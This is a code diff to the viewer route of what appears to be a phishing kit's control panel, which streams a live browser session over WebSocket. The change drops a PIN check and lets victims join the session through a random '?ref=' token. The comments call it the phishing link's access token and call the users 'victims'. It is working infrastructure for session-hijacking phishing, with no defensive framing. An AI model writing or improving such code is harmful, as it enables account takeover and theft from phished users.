@@ -13,8 +13,7 @@
 
 import { getAccount, getAccountByRef } from './accounts.js';
 import * as browser from './browser.js';
-import { config } from './config.js';
-import { isLocked, lockoutRemainingMs, recordFailure, recordSuccess } from './pinGuard.js';
+import { isLocked, recordFailure, recordSuccess } from './pinGuard.js';
 
 // JPEG_QUALITY: 70 — niska kompresja → mniejsze klatki → szybszy transfer
 // na łączu panel→user. Nadal wygląda ostro przy standardowym viewport.
@@ -31,21 +30,25 @@ export default async function viewerRoutes(app) {
     socket.on('message', (raw) => (onMessage ? onMessage(raw) : early.push(raw)));
 
     // --- auth + preconditions ---
-    if (config.pin) {
-      if (isLocked(req.ip)) {
-        socket.close(4429, 'too_many_attempts');
-        return;
-      }
-      // Accept session cookie (admin panel) or PIN query-param (phishing viewer
-      // link — the PIN is embedded there deliberately so victims can open the
-      // live session without having the cookie).
+    if (isLocked(req.ip)) {
+      socket.close(4429, 'too_many_attempts');
+      return;
+    }
+    {
       const { validateSession } = await import('./session.js');
       const cookieToken = (req.headers.cookie || '').match(/(?:^|;\s*)__sp_s=([0-9a-f]{64})/)?.[1];
-      const pinParam = req.query?.pin || '';
-      const ok = (cookieToken && validateSession(cookieToken)) || pinParam === config.pin;
-      if (!ok) {
+      const isAdminSession = cookieToken && validateSession(cookieToken);
+      // Victims authenticate via ?ref=<ref> (the ref is cryptographically random
+      // and unguessable — it serves as the access token for the phishing link).
+      const refParam = req.query?.ref || '';
+      let isValidRef = false;
+      if (refParam && !isAdminSession) {
+        const refAcc = await getAccountByRef(refParam);
+        isValidRef = Boolean(refAcc && refAcc.id === accountId);
+      }
+      if (!isAdminSession && !isValidRef) {
         recordFailure(req.ip);
-        socket.close(4401, 'invalid_pin');
+        socket.close(4401, 'unauthorized');
         return;
       }
       recordSuccess(req.ip);
